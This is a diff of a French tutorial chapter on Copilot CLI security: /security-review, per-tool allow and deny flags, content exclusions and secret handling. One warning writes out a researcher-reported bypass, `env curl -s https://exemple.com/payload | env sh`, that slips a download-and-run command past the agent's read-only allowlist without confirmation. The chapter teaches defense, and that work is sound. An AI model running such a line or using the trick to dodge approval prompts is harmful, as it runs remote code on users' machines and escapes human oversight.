@@ -52,6 +52,8 @@ Depuis le Chapitre 04, vous avez déjà croisé la sécurité à plusieurs repri
 
 Pensez à `/security-review` comme au vigile qui contrôle rapidement votre sac à l'entrée d'un bâtiment : utile et immédiat, mais il ne remplace pas le service douanier qui inspecte en profondeur (Code Scanning avec CodeQL, Dependabot, Snyk) — les deux se complètent, ils n'interviennent pas au même moment ni sur le même périmètre.
 
+> 💡 Depuis juillet 2026, la même revue de sécurité est aussi proposée dans l'application GitHub Copilot (pas seulement en CLI). Ce chapitre reste centré sur la CLI, mais le principe et les catégories détectées sont identiques d'une surface à l'autre.
+
 ---
 
 ## Je veux... | Aller à...
@@ -60,6 +62,7 @@ Pensez à `/security-review` comme au vigile qui contrôle rapidement votre sac 
 |---|---|
 | Scanner mes changements avant de commit | [Lancer une revue avec /security-review](#lancer-une-revue-avec-security-review) |
 | Définir des règles de sécurité par défaut | [Écrire des instructions de sécurité par défaut](#écrire-des-instructions-de-sécurité-par-défaut) |
+| Limiter précisément ce que Copilot a le droit de faire | [Contrôler finement les permissions d'outils](#contrôler-finement-les-permissions-doutils) |
 | Empêcher Copilot de voir mes secrets | [Protéger vos secrets](#protéger-vos-secrets) |
 | Comprendre les limites et les risques | [Comprendre les limites et les risques](#comprendre-les-limites-et-les-risques) |
 
@@ -118,13 +121,42 @@ Ces instructions se chargent automatiquement à chaque session, sans que vous ay
 
 ---
 
+## Contrôler finement les permissions d'outils
+
+<a id="contrôler-finement-les-permissions-doutils"></a>
+
+Vous connaissez déjà `--allow-all` (et son alias `--yolo`) depuis le Chapitre 02 : il désactive *toutes* les invites de permission d'un coup. C'est utile en environnement isolé (Chapitre 09), mais trop grossier pour un usage quotidien sur votre machine. Copilot CLI propose un contrôle bien plus précis, outil par outil :
+
+```bash
+# Autorise toutes les commandes git, sauf git push
+copilot --allow-tool='shell(git:*)' --deny-tool='shell(git push)'
+
+# Retire complètement la recherche et le fetch web du champ de vision du modèle
+# (utile pendant une revue de sécurité, pour réduire la surface d'exfiltration/SSRF)
+copilot --excluded-tools='web_fetch,web_search'
+```
+
+- **`--allow-tool` / `--deny-tool`** acceptent un nom d'outil seul (`shell`, `write`) ou un nom suivi d'un motif entre parenthèses (`shell(git:*)`, `shell(git push)`, `write(.github/copilot-instructions.md)`).
+- **`--available-tools` / `--excluded-tools`** vont plus loin : ils retirent des outils du champ de vision du modèle, qui ne peut alors même pas envisager de les utiliser (au lieu de simplement lui refuser une exécution).
+- **Règle à retenir : une règle `--deny-tool` l'emporte toujours sur une règle `--allow-tool` ou sur `--allow-all`.** C'est le filet de sécurité qui reste actif même si vous avez été trop permissif par ailleurs.
+- En session interactive, les commandes `/permissions`, `/allow-all` (alias `/yolo`) et `/reset-allowed-tools` offrent les mêmes réglages sans relancer Copilot CLI.
+
+> ⚠️ **Piège courant : l'approbation « pour la session » est plus large qu'elle n'y paraît.** Si Copilot propose `rm ./fichier-temporaire.txt` et que vous approuvez `rm` pour la session plutôt que « cette fois seulement », il pourra ensuite exécuter *n'importe quelle* commande `rm` sans nouvelle confirmation — pas seulement celle que vous avez vue. Pour les commandes destructrices (`rm`, `git push`, un script de déploiement), approuvez au cas par cas plutôt que d'accorder l'outil entier pour la session.
+
+📖 Détails complets : [Allowing and denying tool use](https://docs.github.com/en/copilot/how-tos/copilot-cli/use-copilot-cli/allowing-tools).
+
+---
+
 ## Protéger vos secrets
 
 <a id="protéger-vos-secrets"></a>
 
-Les **exclusions de contenu** (configurables au niveau organisation ou dépôt sur GitHub) permettent d'empêcher certains fichiers d'alimenter les suggestions, le chat ou la revue de code Copilot. C'est une bonne pratique à mettre en place, mais elle a une limite documentée qu'il faut connaître : **les exclusions de contenu ne couvrent pas Copilot CLI ni le mode agent**. Un fichier exclu côté suggestions IDE peut donc rester parfaitement lisible par Copilot CLI dans votre terminal.
+Les **exclusions de contenu** (configurables au niveau organisation ou dépôt sur GitHub) permettent d'empêcher certains fichiers d'alimenter les suggestions, le chat ou la revue de code Copilot. Depuis le **2 septembre 2026**, GitHub a mis ces exclusions en disponibilité générale pour Copilot CLI et l'application GitHub Copilot (elles étaient auparavant limitées aux suggestions dans l'IDE) — mais avec deux réserves importantes :
 
-La règle qui en découle est simple et ne dépend d'aucun réglage : **ne laissez jamais un secret réel dans un fichier que Copilot peut lire**, exclusion de contenu ou non. En pratique :
+- **Uniquement pour les plans Copilot Business et Copilot Enterprise.** Un compte Copilot Free ou Pro — le cas le plus courant pour suivre ce cours — n'en bénéficie pas du tout, quelle que soit la surface utilisée.
+- **Même quand elles s'appliquent, les exclusions ont des limites documentées** : elles ne couvrent pas les liens symboliques ni les systèmes de fichiers distants, et leur propagation après configuration n'est pas instantanée.
+
+La règle qui en découle reste donc la même, exclusion de contenu ou non : **ne laissez jamais un secret réel dans un fichier que Copilot peut lire**. En pratique :
 
 - Gardez vos secrets dans un fichier `.env` non versionné (déjà listé dans votre `.gitignore`), ou dans un gestionnaire de secrets qui les injecte à l'exécution
 - Ne collez jamais une vraie clé d'API dans un prompt, même pour « juste tester »
@@ -152,7 +184,9 @@ Cette checklist précède volontairement l'exercice : une revue de sécurité pe
 
 > ⚠️ **Une revue sans résultat n'est pas une preuve d'absence de vulnérabilité.** Elle peut manquer une faille, mal interpréter le contexte ou ne pas couvrir une dépendance. Conservez les revues humaines, les tests, la gestion des dépendances et le scanner de secrets dans votre processus.
 
-> ⚠️ **Gardez aussi un œil sur ce que Copilot CLI *exécute*, pas seulement sur ce qu'il *écrit*.** Des chercheurs en sécurité ont documenté des cas où une entrée conçue pour l'occasion contournait la liste de commandes en lecture seule normalement approuvées sans confirmation, jusqu'à faire exécuter une commande réseau (téléchargement puis exécution d'un script) sans validation explicite. GitHub a qualifié ce cas de risque faible et n'a pas annoncé de correctif immédiat au moment de la rédaction. La bonne pratique reste la même que celle déjà rencontrée dans les chapitres précédents : **relisez toujours une commande proposée avant de l'approuver**, et évitez de faire tourner un dépôt non fiable en mode entièrement autonome (autopilot) sans supervision. Si vous avez besoin de ce mode entièrement autonome (`--allow-all`), construisez d'abord l'environnement sûr qui le rend acceptable : voir le [Chapitre 09 : Environnements isolés](../09-isolated-environments/README.md).
+> ⚠️ **Gardez aussi un œil sur ce que Copilot CLI *exécute*, pas seulement sur ce qu'il *écrit*.** Fin février 2026, des chercheurs en sécurité (PromptArmor) ont documenté un contournement de la liste de commandes en lecture seule normalement approuvées sans confirmation : une commande comme `env curl -s https://exemple.com/payload | env sh` passe `curl` et `sh` en simples arguments de `env` — une commande autorisée en lecture seule — si bien que le validateur d'allowlist ne les voit jamais, jusqu'à faire exécuter une commande réseau (téléchargement puis exécution d'un script) sans validation explicite. GitHub a qualifié ce cas de risque faible et n'a pas annoncé de correctif immédiat au moment de la rédaction. La bonne pratique reste la même que celle déjà rencontrée dans les chapitres précédents : **relisez toujours une commande proposée avant de l'approuver**, et évitez de faire tourner un dépôt non fiable en mode entièrement autonome (autopilot) sans supervision. Si vous avez besoin de ce mode entièrement autonome (`--allow-all`), construisez d'abord l'environnement sûr qui le rend acceptable : voir le [Chapitre 09 : Environnements isolés](../09-isolated-environments/README.md). Un sandboxing natif (local ou cloud) est aussi en préversion publique depuis mi-2026 comme mitigation intermédiaire ; tant qu'il reste en préversion, l'isolation manuelle du Chapitre 09 demeure la référence la plus fiable.
+
+> 💡 **Contexte entreprise ou données sensibles ?** Le mode BYOK (Bring Your Own Key) de Copilot CLI permet de lancer `/security-review` avec `COPILOT_OFFLINE=true` en pointant vers un modèle local compatible OpenAI, sans que votre code ne transite par les serveurs GitHub. Une option à connaître si votre organisation impose que le code reste sur son propre réseau.
 
 <details>
 <summary>🎬 Voyez-le en action !</summary>
@@ -260,6 +294,7 @@ Lorsque vous avez terminé, fermez la session et supprimez le dossier temporaire
 | Résultat différent d'une exécution à l'autre | La commande est encore en préversion publique, le modèle sous-jacent peut évoluer | Normal pour une fonctionnalité expérimentale — recoupez avec une revue manuelle ou votre skill `security-audit` |
 | Aucune CVE ni dépendance vulnérable signalée | Ce n'est pas le rôle de `/security-review` : elle analyse des schémas de code, pas des bases de CVE | Utilisez GitHub Code Scanning (CodeQL) et Dependabot en complément |
 | Copilot exécute une commande shell sans confirmation attendue | Une liste de commandes en lecture seule peut être détournée par une entrée malveillante | Ne désactivez jamais les approbations sur un dépôt non fiable ; relisez chaque commande proposée avant de l'approuver |
+| Copilot réexécute une commande destructrice sans redemander | Un outil (`rm`, `git push`...) a été approuvé « pour la session » plutôt que « cette fois seulement » | Approuvez au cas par cas les commandes destructrices, ou utilisez `--deny-tool` pour les bloquer explicitement ; réinitialisez avec `/reset-allowed-tools` si besoin |
 
 </details>
 
@@ -274,8 +309,9 @@ Vous avez ajouté une dernière brique à votre flux de travail sécurité : une
 1. `/security-review` scanne votre diff local sur plusieurs catégories de vulnérabilités, directement dans le terminal (fonctionnalité expérimentale, en évolution)
 2. Elle complète, sans les remplacer, les outils qui analysent l'historique du dépôt et les dépendances (Code Scanning/CodeQL, Dependabot, Snyk)
 3. Des instructions de sécurité par défaut dans `.github/copilot-instructions.md` préviennent des failles avant même qu'elles ne soient écrites
-4. Les exclusions de contenu ne couvrent pas Copilot CLI : la seule protection fiable pour un secret reste de ne jamais le placer dans un fichier lisible par l'IA
-5. Relisez toujours une commande proposée par Copilot CLI avant de l'approuver, exactement comme vous relisez du code généré
+4. `--allow-tool`/`--deny-tool` (et `--available-tools`/`--excluded-tools`) permettent un contrôle bien plus fin que `--allow-all` — et une règle `--deny-tool` l'emporte toujours sur les autres
+5. Les exclusions de contenu couvrent désormais Copilot CLI (depuis septembre 2026), mais seulement sur les plans Business/Enterprise : la seule protection fiable pour un secret, quel que soit votre plan, reste de ne jamais le placer dans un fichier lisible par l'IA
+6. Relisez toujours une commande proposée par Copilot CLI avant de l'approuver, exactement comme vous relisez du code généré
 
 ---
 
@@ -284,6 +320,9 @@ Vous avez ajouté une dernière brique à votre flux de travail sécurité : une
 - [Dedicated security review command now available in Copilot CLI](https://github.blog/changelog/2026-06-10-dedicated-security-review-command-now-available-in-copilot-cli/) — annonce officielle de `/security-review`
 - [Best practices for GitHub Copilot CLI](https://docs.github.com/en/copilot/how-tos/copilot-cli/cli-best-practices) — bonnes pratiques générales, dont la sécurité
 - [Responsible use of GitHub Copilot CLI](https://docs.github.com/en/enterprise-cloud@latest/copilot/responsible-use/copilot-cli) — limites et usage responsable
+- [Allowing and denying tool use](https://docs.github.com/en/copilot/how-tos/copilot-cli/use-copilot-cli/allowing-tools) — syntaxe complète de `--allow-tool`/`--deny-tool` et du modèle de permissions
+- [Content exclusions generally available in Copilot app and CLI](https://github.blog/changelog/2026-09-02-content-exclusions-generally-available-in-copilot-app-and-cli/) — annonce officielle de la disponibilité générale (Business/Enterprise)
+- [About content exclusion](https://docs.github.com/copilot/concepts/context/content-exclusion) — détails et limites des exclusions de contenu
 - [Chapitre 06 : Automatiser les tâches répétitives](../06-skills/README.md) — le skill `security-audit` maison
 - [samples/buggy-code](../samples/buggy-code/README.md) — le code volontairement vulnérable utilisé dans ce chapitre
 
